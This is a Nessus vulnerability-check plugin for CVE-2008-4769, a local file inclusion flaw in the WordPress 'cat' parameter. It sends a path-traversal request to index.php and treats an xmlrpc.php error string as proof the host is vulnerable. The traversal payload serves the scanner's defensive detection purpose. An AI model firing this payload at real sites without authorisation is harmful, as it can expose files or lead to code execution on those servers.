#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(32080);
  script_version("$Revision: 1.5 $");

  script_cve_id("CVE-2008-4769");
  script_bugtraq_id(28845);
  script_xref(name:"Secunia", value:"29949");
  script_xref(name:"OSVDB", value:"44591");

  script_name(english:"WordPress index.php cat Parameter Local File Inclusion");
  script_summary(english:"Tries to read a local file with WordPress");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is prone to a
local file include attack." );
 script_set_attribute(attribute:"description", value:
"The version of WordPress installed on the remote host fails to
sanitize user input to the 'cat' parameter of the 'index.php' script. 
Regardless of PHP's 'register_globals' setting, an unauthenticated
attacker may be able to exploit this issue to view arbitrary files or
to execute arbitrary PHP code on the remote host, subject to the
privileges under which the web server operates." );
 script_set_attribute(attribute:"see_also", value:"http://trac.wordpress.org/changeset/7586" );
 script_set_attribute(attribute:"solution", value:
"Apply patches based on the SVN changeset referenced above." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2009 Tenable Network Security, Inc.");

  script_dependencies("wordpress_detect.nasl", "os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


# Unless we're being paranoid, only test Windows.
if (report_paranoia < 2)
{
  os = get_kb_item("Host/OS");
  if (!os || "Windows" >!< os) exit(0);
}


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/wordpress"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Try to retrieve a local file.
  req = http_get(
    item:string(
      dir, "/index.php?",
      "cat=1.php/../../../../xmlrpc"
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if we see an error from xmlrpc.php.
  if ('XML-RPC server accepts POST requests only' >< res)
  {
    security_warning(port);
    exit(0);
  }
}
